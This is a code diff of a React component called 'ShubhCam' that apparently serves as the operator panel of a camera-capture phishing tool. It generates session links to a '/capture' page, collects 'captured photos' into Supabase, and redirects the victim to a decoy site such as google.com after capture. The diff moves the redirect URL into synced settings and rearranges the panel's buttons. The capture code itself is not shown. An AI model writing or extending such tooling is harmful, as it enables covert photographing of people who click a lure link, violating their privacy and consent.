@@ -18,19 +18,19 @@ interface CapturedPhoto {
 const ShubhCam = () => {
   const { settings, updateSettings } = useSettings();
   const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom">("link");
-  const [redirectUrl, setRedirectUrl] = useState("https://google.com");
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
   const [loading, setLoading] = useState(false);
   const [customHtml, setCustomHtml] = useState(settings.customCaptureHtml || "");
   const fileInputRef = useRef<HTMLInputElement>(null);
   
-  // Use session ID from settings (synced across all devices via Supabase)
+  // Use session ID and redirect URL from settings (synced across all devices via Supabase)
   const sessionId = settings.camSessionId || "shubhcam01";
+  const redirectUrl = settings.camRedirectUrl || "https://google.com";
 
   // Get current domain for link generation
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
   const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
-  const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
+  const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
 
   // Load photos from Supabase
   const loadPhotos = async () => {
@@ -258,6 +258,50 @@ const ShubhCam = () => {
             <p className="text-neon-orange text-xs mt-2">
               ⚠ Capture ke baad redirect: {redirectUrl}
             </p>
+          </div>
+
+          {/* Redirect URL */}
+          <div>
+            <div className="flex items-center gap-2 mb-2">
+              <span className="text-neon-cyan">🔗</span>
+              <h3 className="text-neon-cyan font-bold">REDIRECT URL</h3>
+            </div>
+            <Input
+              value={redirectUrl}
+              onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
+              placeholder="https://google.com"
+              className="bg-input border-neon-green/50 text-neon-green"
+            />
+            <p className="text-neon-purple text-xs mt-2">
+              💡 User capture ke baad is URL pe redirect hoga
+            </p>
+          </div>
+
+          {/* Test Link */}
+          <Button
+            onClick={() => window.open(captureLink, '_blank')}
+            variant="outline"
+            className="w-full border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
+          >
+            <ExternalLink className="w-4 h-4 mr-2" /> TEST LINK
+          </Button>
+
+          {/* Action Buttons */}
+          <div className="space-y-3">
+            <Button
+              onClick={generateNewSession}
+              variant="outline"
+              className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
+            >
+              <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
+            </Button>
+            <Button
+              onClick={refreshPhotos}
+              className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
+            >
+              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH PHOTOS
+            </Button>
+          </div>
         </div>
       ) : activeTab === "custom" ? (
         <div className="space-y-4">
@@ -338,50 +382,6 @@ const ShubhCam = () => {
               </Button>
             </div>
           )}
-        </div>
-
-          {/* Redirect URL */}
-          <div>
-            <div className="flex items-center gap-2 mb-2">
-              <span className="text-neon-cyan">🔗</span>
-              <h3 className="text-neon-cyan font-bold">REDIRECT URL</h3>
-            </div>
-            <Input
-              value={redirectUrl}
-              onChange={(e) => setRedirectUrl(e.target.value)}
-              placeholder="https://google.com"
-              className="bg-input border-neon-green/50 text-neon-green"
-            />
-            <p className="text-neon-purple text-xs mt-2">
-              💡 User capture ke baad is URL pe redirect hoga
-            </p>
-          </div>
-
-          {/* Test Link */}
-          <Button
-            onClick={() => window.open(captureLink, '_blank')}
-            variant="outline"
-            className="w-full border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
-          >
-            <ExternalLink className="w-4 h-4 mr-2" /> TEST LINK
-          </Button>
-
-          {/* Action Buttons */}
-          <div className="space-y-3">
-            <Button
-              onClick={generateNewSession}
-              variant="outline"
-              className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
-            >
-              <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
-            </Button>
-            <Button
-              onClick={refreshPhotos}
-              className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
-            >
-              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH PHOTOS
-            </Button>
-          </div>
         </div>
       ) : (
         <div className="space-y-4">
